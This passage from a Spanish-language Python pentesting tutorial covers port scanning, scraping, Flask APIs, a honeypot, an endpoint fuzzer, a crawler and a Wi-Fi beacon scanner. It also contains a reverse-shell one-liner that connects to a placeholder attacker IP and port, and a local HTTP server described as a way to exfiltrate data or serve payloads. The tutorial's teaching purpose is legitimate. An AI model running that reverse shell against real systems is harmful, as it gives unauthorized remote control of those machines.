        tareas = {ejecutor.submit(escanear_puerto, puerto): puerto for puerto in rango_puertos}

        # Imprimimos los resultados a medida que terminan
        for tarea in as_completed(tareas):
            puerto, estado = tarea.result()
            if estado == "ABIERTO":
                print(f"Puerto TCP {puerto}: {estado}")

# Llamamos a la función principal
if __name__ == "__main__":
    escaneo_con_hilos()
```

### Expresiones regulares

#### 1. Ejemplo de expresiones regulares básicas: `scrap.py`

Este pequeño programa toma una URL como argumento, descarga el contenido HTML del sitio web, y usa una expresión regular para buscar texto dentro de etiquetas <div> que parezca un nombre de dominio (como ejemplo.com). El patrón busca secuencias de letras, números, puntos o guiones. Luego imprime los resultados ordenados y sin duplicados. Es útil como introducción a tareas de web scraping y manejo de expresiones regulares en Python.

```python
# Uso: python scrap.py http://www.ewhois.com/ebay.com/
# Este script extrae cadenas de texto específicas de un sitio web usando expresiones regulares.

import sys
import re
import requests

def main():
    if len(sys.argv) < 2:
        print("Uso: python scrap.py <URL>")
        return

    site = sys.argv[1]
    try:
        response = requests.get(site)
        html = response.text
    except requests.RequestException as e:
        print(f"Error al acceder al sitio: {e}")
        return

    # Buscar patrones tipo dominio dentro de <div> como "ejemplo.com"
    resultados = re.findall(r"<div>([a-z0-9.\-]+?)\s", html, re.IGNORECASE)

    for item in sorted(set(resultados)):
        print(item)

if __name__ == "__main__":
    main()

```

### Usar Python para lanzar consolas shell y servidores

#### 1. Ejemplo de Shell: `shell_spawn.txt`

Esto se utiliza comúnmente cuando se obtiene un shell limitado (por ejemplo, desde un shell reverso o una sesión SSH sin soporte completo de terminal) y se desea hacerlo interactivo. Un shell interactivo admite funciones como:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
- **Control de tarea**: Usar `Ctrl+C`, `Ctrl+Z`, etc.
- **Teclas de flechas**: se pueded navegar con las flechas.
- **Tab completion**: funciona autocompletado con `Tab`.


#### 2. Ejemplo de Shell reversa `shell_reverse.txt`

Una shell reversa permite que un sistema objetivo se conecte de vuelta a un atacante/auditor, proporcionando acceso remoto. Se usa en:

- Auditorías de seguridad legítimas
- Red Team exercises autorizados
- Investigación de seguridad

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("TU_IP",TU_PUERTO));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
# Reemplaza TU_IP: Dirección IP del servidor que escucha
# Reemplaza TU_PUERTO: Puerto del servidor (ejemplo: 4444)
# Escuchar en el puerto 4444 en mi ordenador remoto
# nc -lvnp 4444
```

#### 3. Ejemplo de Servidor Web básico

Para un hacker, el uso de comandos como python3 -m http.server 8080 (o su equivalente en Python 2) permite levantar rápidamente un servidor web local para compartir archivos, ejecutar pruebas de red o simular servicios HTTP durante ejercicios de pentesting o análisis forense. Por ejemplo, puede usarse para exfiltrar datos en un entorno controlado, probar la descarga de herramientas desde otra máquina en la red, o servir cargas útiles (payloads) durante una auditoría de seguridad. Su simplicidad y portabilidad lo convierten en una herramienta útil y versátil en entornos de laboratorio o situaciones de respuesta rápida.

```bash
# For Python 2.5
python2 -m SimpleHTTPServer 8080

# For Python3
python3 -m http.server 8080
```



### Compilación en Python

#### 1. Ejemplo para Compilar aplicación de python

Este ejemplo explica cómo convertir scripts de Python en archivos ejecutables (.exe) para Windows, útil para distribuir herramientas y utilidades sin requerir que Python esté instalado, algo que se suele hacer mucho para los exploits escritos en Python.

```bash
# Instalar PyInstaller
pip3 install pyinstaller

# Si necesitas librerías específicas de Windows
pip install pywin32

# Compilar a ejecutable
cd ruta/a/tu/proyecto

# Compilar
pyinstaller --onefile mi_herramienta.py
# El ejecutable estará en: dist/mi_herramienta
```

### Aplicaciones Web, pentesting web y APIs

#### 1. Ejemplo: Usando requests para ver el estado de una página web `check-url.py`

Este programa permite comprobar si una página web responde correctamente cuando intentamos visitarla. El usuario introduce una URL, y el script envía una petición al sitio usando la librería requests. Según la respuesta del servidor, el programa muestra un código de estado (por ejemplo, 200, 404, 503) junto con una breve explicación. Es un ejercicio útil para aprender cómo funcionan las solicitudes HTTP, cómo manejar errores y cómo trabajar con argumentos desde la línea de comandos en Python.

```python
import requests
import argparse

# Configuramos los argumentos que el usuario puede pasarle al script
parser = argparse.ArgumentParser(description="Comprobar el estado HTTP de una URL.")
parser.add_argument("--url", type=str, help="La URL a comprobar.")
args = parser.parse_args()

# Aseguramos que la URL empiece con http:// o https://
def ensure_https(url):
    if not url.startswith("http://") and not url.startswith("https://"):
        return "https://" + url
    return url

# Realiza la petición HTTP y devuelve el código de estado
def check_endpoint(url):
    try:
        response = requests.get(url, timeout=10)  # timeout evita que se quede colgado
        return response.status_code
    except requests.Timeout:
        return 0     # Si tarda demasiado
    except requests.RequestException:
        return 99    # Cualquier otro error

# Traducción simple de algunos códigos de estado comunes
def translate_status_code(code):
    translations = {
        0:  "Timeout",
        99: "Error",
        200: "OK",
        301: "Moved Permanently",
        302: "Found",
        400: "Bad Request",
        401: "Unauthorized",
        403: "Forbidden",
        404: "Not Found",
        500: "Internal Server Error",
        503: "Service Unavailable"
    }
    return translations.get(code, "Estado desconocido")

# Código principal del script
if args.url:
    url = ensure_https(args.url)  # Normalizamos la URL
    status_code = check_endpoint(url)
    status_text = translate_status_code(status_code)

    print(f"{url} - {status_code} ({status_text})")
else:
    print("Error: Debes especificar una URL con --url")
```



#### 2. Ejemplo: Crear una API simple mediante Flask `api_users.py` y `api_users_443.py` (SSL en puerto 443)

Este programa crea un pequeño servidor web usando Flask, una librería muy popular en Python para construir APIs. Cuando se accede a la ruta /users, el servidor responde con una lista de usuarios simulados en formato JSON. Si se intenta acceder a cualquier otra ruta, el servidor devolverá un mensaje de error (404). Es una excelente forma de entender cómo funcionan las rutas, las respuestas HTTP y el trabajo con datos en formato JSON.

```python
# Requiere instalación previa de Flask: pip install flask
from flask import Flask, jsonify  # Importamos las funciones necesarias

# Creamos una aplicación Flask
app = Flask(__name__)

# Datos falsos de ejemplo (como si fueran sacados de una base de datos)
usuarios_falsos = [
    {"id": 1, "nombre": "Alice", "email": "alice@example.com"},
    {"id": 2, "nombre": "Bob", "email": "bob@example.com"},
    {"id": 3, "nombre": "Charlie", "email": "charlie@example.com"},
]

# Ruta principal para obtener la lista de usuarios
@app.route("/users", methods=["GET"])
def obtener_usuarios():
    return jsonify(usuarios_falsos), 200  # Convertimos la lista a JSON y devolvemos un código 200 (OK)

# Ruta para cualquier otro camino no definido → devuelve error 404
@app.route("/", defaults={"path": ""})
@app.route("/<path:path>")
def ruta_no_encontrada(path):
    return jsonify({"error": "Ruta no encontrada"}), 404

# Ejecutamos la aplicación si este archivo es el principal
if __name__ == "__main__":
    app.run(host="127.0.0.1", port=8000)  # El servidor se inicia en localhost:8000
```


#### 3. Ejemplo: Crear una API honeypot `api_honeypot.py` y `api_honeypot_with_geolocation_data.py`

Este programa es un honeypot web básico: un servidor que aparenta ser una API real, pero en realidad registra toda interacción sospechosa que reciba. Cualquier acceso a la ruta /api/ (o cualquier subruta de esta) será registrado con detalles como dirección IP, encabezados, tipo de petición, etc., y se guarda todo en un archivo JSON. Además, el servidor usa HTTPS (SSL), lo cual simula una API segura. Esto puede ayudar a detectar escaneos automáticos, bots o intentos de acceso no autorizados.

```python
# Para usar HTTPS necesitas certificados:
# Genera los archivos con este comando antes de ejecutar:
# openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

from flask import Flask, request, jsonify
import json
import os
from datetime import datetime

app = Flask(__name__)  # Creamos la app Flask

ARCHIVO_LOG = "registro_honeypot.json"  # Nombre del archivo donde guardamos las visitas

# Función para guardar cada petición que llega
def guardar_log(data):
    if not os.path.exists(ARCHIVO_LOG):
        with open(ARCHIVO_LOG, "w") as f:
            json.dump([], f)  # Si no existe, creamos una lista vacía

    with open(ARCHIVO_LOG, "r") as f:
        logs = json.load(f)  # Leemos los logs existentes

    logs.append(data)  # Agregamos la nueva entrada

    with open(ARCHIVO_LOG, "w") as f:
        json.dump(logs, f, indent=4)  # Guardamos todo actualizado

# Esta función se ejecuta automáticamente antes de cada petición
@app.before_request
def registrar_peticion():
    datos = {
        "momento": datetime.utcnow().isoformat(),
        "ip_origen": request.remote_addr,
        "user_agent": request.headers.get("User-Agent"),
        "metodo": request.method,
        "ruta": request.path,
        "params_url": request.args.to_dict(),
        "formulario": request.form.to_dict(),
        "json_enviado": request.get_json(silent=True),
        "encabezados": dict(request.headers),
    }

    guardar_log(datos)  # Guardamos la información

# Ruta simulada de API: responde 404 a todo
@app.route("/api/", defaults={"path": ""})
@app.route("/api/<path:path>")
def todo_no_encontrado(path):
    return jsonify({"error": "Ruta no válida"}), 404

# Ejecutamos la app con soporte SSL
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=443, ssl_context=("cert.pem", "key.pem"))
```


#### 4. Crear un fuzzer simple para pentesting API `api_fuzzer.py`

Este script intenta encontrar rutas válidas en una API enviando solicitudes a una lista de posibles endpoints, usando métodos HTTP como GET y POST. Por ejemplo, prueba si existen rutas como /login, /user, /admin, etc. Si el servidor responde con un código exitoso (como 200 o 302), el script lo muestra por pantalla. Esto es útil para aprender cómo interactuar con APIs, automatizar pruebas de seguridad básicas o verificar rutas activas.

```python
# Requiere: pip install requests
import requests

# URL base de la API que vamos a "fuzzear"
url_base = "https://127.0.0.1/api"  # Cambia esto por la URL real de tu API

# Archivo de texto con posibles rutas (una por línea, como: login, user, admin)
archivo_diccionario = "endpoints.txt"

# Métodos HTTP que queremos probar
metodos = ["GET", "POST"]

# Cargamos las posibles rutas desde el archivo
with open(archivo_diccionario, "r") as archivo:
    rutas = [linea.strip() for linea in archivo if linea.strip()]

# Probamos cada ruta con cada método
for ruta in rutas:
    for metodo in metodos:
        url_completa = f"{url_base}/{ruta}"

        try:
            # Enviamos la petición dependiendo del método
            if metodo == "GET":
                respuesta = requests.get(url_completa, verify=False)  # verify=False para ignorar SSL autofirmado
            elif metodo == "POST":
                respuesta = requests.post(url_completa, verify=False)

            # Mostramos solo si la ruta devuelve un código exitoso (< 400)
            if respuesta.status_code < 400:
                print(f"[{metodo}] {url_completa} - Código: {respuesta.status_code}")

        except requests.RequestException as error:
            print(f"Error con {metodo} {url_completa}: {error}")

```


#### 5. Ejemplo: Crear una araña `crawler_spider.py`

Este script básico en Python implementa un "web spider", es decir, un programa que visita una página web y sigue los enlaces que encuentra para visitar otras páginas, hasta una cierta profundidad (nivel). El objetivo es mostrar cómo recorrer sitios web automáticamente y extraer contenido. Utiliza la librería requests para obtener el contenido HTML, BeautifulSoup para analizarlo, y urljoin para construir enlaces completos a partir de enlaces relativos.

```python
# Este programa explora un sitio web y sigue enlaces hasta una cierta profundidad.
# Ideal para aprender cómo funciona un "web crawler" simple.

import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# Función principal del "spider" (rastreador)
def simple_spider(start_url, max_depth=2):
    visited = set()  # Conjunto para guardar URLs visitadas y no repetir

    # Función interna recursiva para explorar las páginas
    def crawl(url, depth):
        if depth > max_depth:
            return  # Si se alcanza la profundidad máxima, detenemos la exploración
        if url in visited:
            return  # Si ya visitamos esta URL, la ignoramos

        print(f"Explorando: {url}")
        visited.add(url)  # Marcamos la URL como visitada

        try:
            response = requests.get(url)
            response.raise_for_status()  # Verifica que la respuesta sea exitosa (código 200)
        except requests.RequestException as e:
            print(f"No se pudo acceder a {url}: {e}")
            return

        # Usamos BeautifulSoup para analizar el contenido HTML de la página
        soup = BeautifulSoup(response.text, 'html.parser')

        # Buscamos todos los enlaces (<a href="...">)
        for link in soup.find_all("a", href=True):
            full_url = urljoin(url, link["href"])  # Completamos la URL si es relativa
            crawl(full_url, depth + 1)  # Llamamos recursivamente para seguir ese enlace

    # Iniciamos el rastreo desde la URL proporcionada
    crawl(start_url, depth=0)

# Ejecución principal: define el sitio y empieza a explorar
if __name__ == "__main__":
    # Puedes cambiar esta URL por otra para probar
    start_url = "https://example.com"
    simple_spider(start_url, max_depth=2)

```

### Uso de Python para la monitorización y control de tráfico de Redes

#### 1. Ejemplo: Escáner de APs Wi-Fi avanzado usando scapy y OUI.txt `scapy_get_aps_around.py`

Este script en Python escanea redes Wi-Fi cercanas y muestra el nombre de la red (SSID), su dirección MAC (BSSID) y, si es posible, el nombre del fabricante del dispositivo que la emite, usando un archivo de datos llamado oui_list.json. Los puntos de acceso Wi-Fi (routers, por ejemplo) emiten señales llamadas tramas beacon, que este programa detecta usando la librería scapy. Cada dispositivo tiene una dirección MAC, y los primeros tres bloques (el OUI) indican quién lo fabricó (por ejemplo, TP-Link, Cisco, etc.).

Cuando el programa detecta una de estas señales, extrae el BSSID, obtiene el OUI y lo busca en el archivo oui_list.json para identificar la organización. Esta información se imprime en pantalla. Así, el programa actúa como un escáner de redes Wi-Fi con identificación del fabricante.

- Necesita tener la OUI list actualizada con el nombre `oui_list.json`

```python
# IMPORTANTE: asegúrate de que la interfaz esté en modo monitor (ej. "wlan0mon") y ejecuta este script como root (sudo)

from scapy.all import *
import json
from scapy.layers.dot11 import Dot11, Dot11Beacon

# Path to the JSON file with OUI data
OUI_JSON_FILE = "oui_list.json"

# Wi-Fi interface to use for scanning (e.g., "wlan0")
INTERFACE = "wlan0mon"

# Load the OUI data from the JSON file
def load_oui_data():
    try:
        with open(OUI_JSON_FILE, "r") as f:
            oui_data = json.load(f)
            # Convert the OUI list to a dictionary for faster lookup
            return {entry["oui"]: entry["organization"] for entry in oui_data}
    except (IOError, json.JSONDecodeError) as e:
        print(f"Error loading OUI data: {e}")
        return {}


# Extract the OUI part (first three octets) from a BSSID
def get_oui_from_bssid(bssid):
    return "".join(bssid.split(":")[:3]).upper()


# Callback function for processing packets
def packet_handler(packet, oui_lookup):
    # Check if the packet is a beacon frame from an AP
    if packet.haslayer(Dot11Beacon):
        bssid = packet[Dot11].addr2  # Get the BSSID (MAC address of the AP)
        ssid = packet[Dot11Elt].info.decode() if packet[Dot11Elt].info else "Hidden SSID"
        oui = get_oui_from_bssid(bssid)  # Extract OUI part of the BSSID
        organization = oui_lookup.get(oui, "Unknown")  # Lookup the organization

        # Print AP information
        print(f"SSID: {ssid}, BSSID: {bssid}, Organization: {organization}")

# Main function
def main():
    # Load the OUI data
    oui_lookup = load_oui_data()
    if not oui_lookup:
        print("OUI data could not be loaded.")
        return

    print("Starting Wi-Fi scan... (Press Ctrl+C to stop)")

    # Start sniffing for 802.11 beacon frames on the specified interface
    sniff(iface=INTERFACE, prn=lambda pkt: packet_handler(pkt, oui_lookup), store=0)

if __name__ == "__main__":
    main()

```

---

